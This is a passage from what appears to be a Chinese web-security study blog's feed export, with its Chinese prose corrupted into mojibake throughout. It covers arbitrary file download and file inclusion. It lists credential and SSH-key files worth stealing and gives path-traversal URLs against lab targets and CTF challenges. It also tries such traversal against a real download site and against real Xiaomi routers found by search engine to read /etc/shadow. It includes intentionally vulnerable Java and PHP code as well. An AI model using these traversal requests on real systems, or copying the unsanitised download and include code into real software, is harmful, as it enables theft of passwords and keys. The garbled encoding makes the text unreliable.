//å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span><br><span class="line">C:\Program Files\mysql\my.ini //Mysqlé…ç½®</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //phpé…ç½®ä¿¡æ¯</span><br><span class="line">C:\Windows\my.ini //Mysqlé…ç½®ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">/root/.ssh/authorized_keys //å¦‚éœ€ç™»å½•åˆ°è¿œç¨‹ä¸»æœºï¼Œéœ€è¦åˆ°.sshç›®å½•ä¸‹ï¼Œæ–°å»ºauthorized_keysæ–‡ä»¶ï¼Œå¹¶å°†id_rsa.pubå†…å®¹å¤åˆ¶è¿›å»</span><br><span class="line">/root/.ssh/id_rsa //sshç§é’¥,sshå…¬é’¥æ˜¯id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">//sshä¼šæŠŠæ¯ä¸ªè®¿é—®è¿‡è®¡ç®—æœºçš„å…¬é’¥(public key)éƒ½è®°å½•åœ¨~/.ssh/known_hostsã€‚å½“ä¸‹æ¬¡è®¿é—®ç›¸åŒè®¡ç®—æœºæ—¶ï¼ŒOpenSSHä¼šæ ¸å¯¹å…¬é’¥ã€‚å¦‚æœå…¬é’¥ä¸åŒï¼ŒOpenSSHä¼šå‘å‡ºè­¦å‘Šï¼Œ é¿å…ä½ å—åˆ°DNS Hijackä¹‹ç±»çš„æ”»å‡»ã€‚</span><br><span class="line">/etc/passwd // è´¦æˆ·ä¿¡æ¯</span><br><span class="line">/etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶</span><br><span class="line">/etc/my.cnf //mysql é…ç½®æ–‡ä»¶</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶</span><br><span class="line">/root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶</span><br><span class="line">/root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶</span><br><span class="line">/proc/self/fd/fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)</span><br><span class="line">/proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡</span><br><span class="line">/porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶</span><br><span class="line">/var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„</span><br><span class="line">/porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°</span><br><span class="line"></span><br><span class="line">java+apacheç«™ç‚¹:</span><br><span class="line">/conf/tomcat-users.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/web.xml</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line">nginxæœåŠ¡å™¨:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><h4 id="ä¸‹è½½å‚æ•°"><a href="#ä¸‹è½½å‚æ•°" class="headerlink" title="ä¸‹è½½å‚æ•°"></a>ä¸‹è½½å‚æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read.xxx?filename=</span><br><span class="line">down.xxx?filename=</span><br><span class="line">readfile.xxx?file=</span><br><span class="line">downfile.xxx?file=</span><br><span class="line">../ ..\ .\ ./ç­‰</span><br><span class="line">%00 ? %23 %20 .ç­‰</span><br><span class="line">&amp;readpath=ã€&amp;filepath=ã€&amp;path=ã€&amp;inputfile=ã€&amp;url=ã€&amp;data=ã€&amp;readfile=ã€&amp;menu=ã€META-INF= ã€</span><br><span class="line">WEB-INF</span><br></pre></td></tr></table></figure><h4 id="å„ç§åè®®è°ƒç”¨é…åˆ"><a href="#å„ç§åè®®è°ƒç”¨é…åˆ" class="headerlink" title="å„ç§åè®®è°ƒç”¨é…åˆ"></a>å„ç§åè®®è°ƒç”¨é…åˆ</h4><p><strong>Javaweb æ–‡ä»¶ä¸‹è½½ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">String path = request.getContextPath();</span><br><span class="line">String basePath =</span><br><span class="line">request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;a href=&quot;/download/DownloadServlet?filename=1.jpg&quot;&gt;æ–‡ä»¶ä¸‹è½½&lt;/a&gt;</span><br><span class="line">public void doGet(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">throws ServletException, IOException &#123;</span><br><span class="line">response.setCharacterEncoding(&quot;UTF-8&quot;);</span><br><span class="line">//è®¾ç½® ContentType å­—æ®µå€¼</span><br><span class="line">response.setContentType(&quot;text/html;charset=utf-8&quot;);</span><br><span class="line">//è·å–æ‰€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°</span><br><span class="line">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class="line">//ä¸‹è½½æ–‡ä»¶æ‰€åœ¨ç›®å½•</span><br><span class="line">String folder = &quot;/filename/&quot;;</span><br><span class="line">//é€šçŸ¥æµè§ˆå™¨ä»¥ä¸‹è½½çš„æ–¹å¼æ‰“å¼€</span><br><span class="line">response.addHeader(&quot;Content-type&quot;, &quot;appllication/octet-stream&quot;);</span><br><span class="line">response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+filename);</span><br><span class="line">//é€šçŸ¥æ–‡ä»¶æµè¯»å–æ–‡ä»¶</span><br><span class="line">InputStream in = getServletContext().getResourceAsStream(folder+filename);</span><br><span class="line">//è·å– response å¯¹è±¡çš„è¾“å‡ºæµ</span><br><span class="line">OutputStream out = response.getOutputStream();</span><br><span class="line">byte[] buffer = new byte[1024];</span><br><span class="line">int len;</span><br><span class="line">//å¾ªç¯å–å‡ºæµä¸­çš„æ•°æ®</span><br><span class="line">while((len = in.read(buffer)) != -1)&#123;</span><br><span class="line">out.write(buffer,0,len);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¶‰åŠæ¡ˆä¾‹ï¼š"><a href="#æ¶‰åŠæ¡ˆä¾‹ï¼š" class="headerlink" title="æ¶‰åŠæ¡ˆä¾‹ï¼š"></a>æ¶‰åŠæ¡ˆä¾‹ï¼š</h3><h4 id="Pikachu-æ–‡ä»¶ä¸‹è½½æµ‹è¯•-å‚æ•°"><a href="#Pikachu-æ–‡ä»¶ä¸‹è½½æµ‹è¯•-å‚æ•°" class="headerlink" title="Pikachu-æ–‡ä»¶ä¸‹è½½æµ‹è¯•-å‚æ•°"></a>Pikachu-æ–‡ä»¶ä¸‹è½½æµ‹è¯•-å‚æ•°</h4><p>ç‚¹å‡»å›¾ç‰‡ä¼šè¿›è¡Œä¸‹è½½ï¼Œä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºæ˜¯æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œåªéœ€è¦ä¿®æ”¹filenameåé¢çš„å‚æ•°å°±å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡é“¾æ¥åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/download/kb.png</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»–ä»¬ä¸åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¿™é‡Œæˆ‘è¯•ç€ä¸‹è½½ä¸€ä¸‹<code>execdownload.php</code>æ–‡ä»¶ï¼Œæ‰€æœ‰éœ€è¦é€€ä¸€çº§ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119125.png" alt="image-20210917104937450"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸä¸‹è½½äº†è¿™ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¸‹è½½é…ç½®æ–‡ä»¶å‘¢ï¼æŸ¥çœ‹æˆ‘ä»¬åˆšä¸‹è½½çš„æ–‡ä»¶å‘ç°æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119040.png" alt="image-20210917105047042"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119082.png" alt="image-20210917105316786"></p><p>æˆåŠŸä¸‹è½½åˆ°è¯¥æ–‡ä»¶</p><h4 id="Zdns-æ–‡ä»¶ä¸‹è½½çœŸå®æµ‹è¯•-åŠŸèƒ½ç‚¹"><a href="#Zdns-æ–‡ä»¶ä¸‹è½½çœŸå®æµ‹è¯•-åŠŸèƒ½ç‚¹" class="headerlink" title="Zdns-æ–‡ä»¶ä¸‹è½½çœŸå®æµ‹è¯•-åŠŸèƒ½ç‚¹"></a>Zdns-æ–‡ä»¶ä¸‹è½½çœŸå®æµ‹è¯•-åŠŸèƒ½ç‚¹</h4><p>å½“æˆ‘ä»¬ç‚¹å‡»ä¸‹è½½åä¼šè¿›è¡Œä¸‹è½½</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119221.png" alt="image-20210917105737348"></p><p>å¤åˆ¶ä¸‹è½½é“¾æ¥å‘ç°é—®é¢˜ï¼Œè¿™é‡Œç”¨äº†base64åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119120.png" alt="image-20210917105906515"></p><p>å¯ä»¥çœ‹åˆ°ç»è¿‡è§£å¯†å‘ç°ï¼Œè¿™é‡ŒåŠ å¯†çš„å†…å®¹å’Œæˆ‘ä»¬ä¸‹è½½çš„åå­—ä¸€æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr</span><br><span class="line"></span><br><span class="line">è§£å¯†:</span><br><span class="line"></span><br><span class="line">/down/20210806/ystpzs_1.1.7_dangbei.apk</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸‹è½½ä¸€ä¸‹ä»–çš„htmlæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://down.znds.com/getdownurl/?s=../apk/app/2019/0909/7206.html</span><br><span class="line">åŠ å¯†å</span><br><span class="line">http://down.znds.com/getdownurl/?s=Li4vYXBrL2FwcC8yMDE5LzA5MDkvNzIwNi5odG1s</span><br></pre></td></tr></table></figure><p>é“¾æ¥è¢«é‡ç½®äº†ã€‚ã€‚ä½†æ˜¯æ¼æ´åº”è¯¥å­˜åœ¨</p><h4 id="å°ç±³è·¯ç”±å™¨-æ–‡ä»¶è¯»å–çœŸå®æµ‹è¯•-æ¼æ´"><a href="#å°ç±³è·¯ç”±å™¨-æ–‡ä»¶è¯»å–çœŸå®æµ‹è¯•-æ¼æ´" class="headerlink" title="å°ç±³è·¯ç”±å™¨-æ–‡ä»¶è¯»å–çœŸå®æµ‹è¯•-æ¼æ´"></a>å°ç±³è·¯ç”±å™¨-æ–‡ä»¶è¯»å–çœŸå®æµ‹è¯•-æ¼æ´</h4><p>fofaä¸­å¯ä»¥æ‰¾åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx:8888/api-third-party/download/extdisks../etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119690.png" alt="image-20210917111357871"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥æˆåŠŸä¸‹è½½åˆ°ä»–çš„æ–‡ä»¶</p><h4 id="RoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç°-æ¯”èµ›"><a href="#RoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç°-æ¯”èµ›" class="headerlink" title="RoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç°-æ¯”èµ›"></a>RoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç°-æ¯”èµ›</h4><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªé“¾æ¥å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œå› ä¸ºæ˜¯javaç¯å¢ƒï¼Œæ‰€æœ‰ä»–çš„é…ç½®æ–‡ä»¶ç›®å½•æ˜¯<code>/WEB-INF/web.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=help.docx</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¿®æ”¹ä¸‹è½½å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119696.png" alt="image-20210917111714361"></p><p>è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹è¿”å›è¿™ä¸ªé”™è¯¯ï¼Œè¡¨ç¤ºjavaæ¥æ”¶çš„æ˜¯POSTå‚æ•°ï¼Œä¸æ˜¯GET</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119954.png" alt="image-20210917111818578"></p><p>è¿™é‡ŒæˆåŠŸä¸‹è½½åˆ°é…ç½®æ–‡ä»¶</p><p>ç„¶åæ‰“å¼€å‘ç°äº†flagçš„ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;  &lt;-</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰javawebå¼€å‘çš„åº”è¯¥çŸ¥é“ï¼Œæ­¤å¤„æŒ‡çš„è·¯å¾„æ˜¯<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><p>æ ¹æ®è¯¥è·¯å¾„æˆåŠŸä¸‹è½½åˆ°flagæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3thM2E1ZDFkOC0xY2UwLTQwNDMtYTAzMi1mYzE4ODYzZDVjMzR9Cg==</span><br></pre></td></tr></table></figure><p>ç»è¿‡è§£å¯†æˆä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3a5d1d8-1ce0-4043-a032-fc18863d5c34&#125;</span><br></pre></td></tr></table></figure><h4 id="ç™¾åº¦æ¯-2017-äºŒæœˆ-Zone-çœŸé¢˜å¤ç°-æ¯”èµ›æ‹“å±•"><a href="#ç™¾åº¦æ¯-2017-äºŒæœˆ-Zone-çœŸé¢˜å¤ç°-æ¯”èµ›æ‹“å±•" class="headerlink" title="ç™¾åº¦æ¯ 2017 äºŒæœˆ-Zone çœŸé¢˜å¤ç°-æ¯”èµ›æ‹“å±•"></a>ç™¾åº¦æ¯ 2017 äºŒæœˆ-Zone çœŸé¢˜å¤ç°-æ¯”èµ›æ‹“å±•</h4><p>é€šè¿‡æŠ“åŒ…å‘ç°Cookieä¸­login=0ï¼Œæˆ‘ä»¬è¯•ç€ä¿®æ”¹ä¸º1</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119957.png" alt="image-20210917112702300"></p><p>ç™»å½•æˆåŠŸåç»§ç»­æŠ“åŒ…</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119190.png" alt="image-20210917135752391"></p><p>è¿™é‡Œå‘ç°æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼ŒæˆåŠŸè¯»å–åˆ°passwdæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..././..././..././etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119339.png" alt="image-20210917140011563"></p><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><ul><li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li><li><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></li><li><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></li><li><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶ä¸‹è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>31WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶åŒ…å«æ¼æ´å…¨è§£</title>
      <link href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«"><a href="#ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«"></a>ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«</h3><p>ä¸ºäº†æ›´å¥½çš„ä½¿ç”¨ä»£ç çš„é‡ç”¨æ€§ï¼Œå¼•å…¥äº†æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œç›´æ¥ä½¿ç”¨åŒ…å«æ–‡ä»¶çš„ä»£ç ã€‚</p><h3 id="æ–‡ä»¶åŒ…å«äº§ç”ŸåŸå› "><a href="#æ–‡ä»¶åŒ…å«äº§ç”ŸåŸå› " class="headerlink" title="æ–‡ä»¶åŒ…å«äº§ç”ŸåŸå› "></a>æ–‡ä»¶åŒ…å«äº§ç”ŸåŸå› </h3><p>åœ¨åŒ…å«æ–‡ä»¶æ—¶å€™ï¼Œä¸ºäº†çµæ´»åŒ…å«æ–‡ä»¶ï¼Œå°†åŒ…å«æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œé€šè¿‡åŠ¨æ€å˜é‡å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶æ—¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ§åˆ¶å˜é‡ï¼Œè€ŒæœåŠ¡å™¨ç«¯æ²¡æœ‰æ ¡éªŒå˜é‡ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé€šå¸¸æ­¤æ¼æ´å‡ºç°åœ¨PHPä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">.......</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h3><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><p>include ï¼ˆæˆ– requireï¼‰è¯­å¥ä¼šè·å–æŒ‡å®šæ–‡ä»¶ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡æœ¬/ä»£ç /æ ‡è®°ï¼Œå¹¶å¤åˆ¶åˆ°ä½¿ç”¨ include è¯­å¥çš„æ–‡ä»¶ä¸­ã€‚</p><p>include å’Œ require è¯­å¥æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†é”™è¯¯å¤„ç†æ–¹é¢ï¼š</p><ul><li>require ä¼šç”Ÿæˆè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰å¹¶åœæ­¢è„šæœ¬</li><li>include åªç”Ÿæˆè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œå¹¶ä¸”è„šæœ¬ä¼šç»§ç»­</li></ul><p>include_once å‡½æ•°ä¼šå°†æŒ‡å®šçš„æ–‡ä»¶è½½å…¥å¹¶æ‰§è¡Œé‡Œé¢çš„ç¨‹åºï¼›æ­¤è¡Œä¸ºå’Œ include è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­å·²ç»è¢«åŒ…å«è¿‡ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</p><p>require_onceä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå½“å¤„ç†åˆ°é”™è¯¯çš„æ—¶å€™ï¼Œrequire_onceä¼šåœæ­¢è„šæœ¬ï¼Œinclude_onceä¸ä¼šã€‚</p><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>æ–‡ä»¶åŒ…å«ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename);</span><br><span class="line">/*</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename.&quot;.html&quot;);</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854089.png" alt="image-20210921085420989"></p><p>æœ¬æ¥æ–‡ä»¶æ˜¯txtçš„æ–‡æœ¬</p><p>ä½†æ˜¯é€šè¿‡æ–‡ä»¶åŒ…å«èƒ½å¤Ÿæ‰§è¡Œå…¶ä¸­çš„ä»£ç </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854530.png" alt="image-20210921085433419"></p><h3 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h3><h4 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h4><p>ä»£ç å®¡è®¡</p><h4 id="é»‘ç›’"><a href="#é»‘ç›’" class="headerlink" title="é»‘ç›’"></a>é»‘ç›’</h4><ul><li>æ¼æ‰«å·¥å…·</li><li>å…¬å¼€æ¼æ´</li><li>æ‰‹å·¥çœ‹å‚æ•°å€¼åŠåŠŸèƒ½</li></ul><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>æ–‡ä»¶å’Œç½‘ç«™åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œç±»ä¼¼åƒ127.0.0.1/?file=../../phpinfo.phpè¿™æ ·å°±å±äºæœ¬åœ°æ–‡ä»¶åŒ…å«</p><h4 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h4><h5 id="æ— é™åˆ¶"><a href="#æ— é™åˆ¶" class="headerlink" title="æ— é™åˆ¶"></a>æ— é™åˆ¶</h5><p>å› ä¸º1.txtåœ¨æ ¹ç›®å½•ä¸‹ï¼Œè€Œtest/phpå’Œå¥¹æœ‰2çº§ç›®å½•ï¼Œæ‰€æœ‰éœ€è¦../é€€ä¿©æ¬¡ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/123/upload/test.php?filename=../../1.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854942.png" alt="image-20210921085443882"></p><h5 id="æœ‰é™åˆ¶"><a href="#æœ‰é™åˆ¶" class="headerlink" title="æœ‰é™åˆ¶"></a>æœ‰é™åˆ¶</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename.&quot;.html&quot;);</span><br></pre></td></tr></table></figure><p>includeä¼šåœ¨filenameåé¢æ·»åŠ 